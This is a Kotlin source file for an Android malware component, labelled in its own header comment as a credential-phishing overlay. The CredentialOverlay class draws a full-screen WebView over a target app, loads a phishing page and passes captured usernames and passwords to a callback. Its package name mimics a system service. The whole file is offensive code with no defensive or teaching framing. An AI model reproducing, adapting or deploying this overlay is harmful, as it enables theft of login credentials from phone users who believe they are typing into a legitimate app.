// [context: Kotlin, Android API 26+, SYSTEM_ALERT_WINDOW overlay to phish credentials]
package com.system.service.modules.overlay

import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.view.*
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.FrameLayout

class CredentialOverlay(private val context: Context) {

    private var wm: WindowManager? = null
    private var overlayView: View? = null

    fun show(targetPkg: String, phishUrl: String, onCredential: (String, String) -> Unit) {
        wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager

        val webView = WebView(context).apply {
            settings.javaScriptEnabled = true
            addJavascriptInterface(object : Any() {
                @android.webkit.JavascriptInterface
                fun captured(user: String, pass: String) {
                    onCredential(user, pass)
                    hide()
                }
            }, "CaptureInterface")
            webViewClient = object : WebViewClient() {}
            loadUrl(phishUrl)
        }

        val layout = FrameLayout(context).apply {
            setBackgroundColor(Color.WHITE)
            addView(webView, FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            ))
        }
        overlayView = layout

        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        else @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_PHONE

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        )
        try { wm?.addView(layout, params) } catch (_: Exception) {}
    }

    fun hide() {
        try { overlayView?.let { wm?.removeView(it) } } catch (_: Exception) {}
        overlayView = null
    }
}
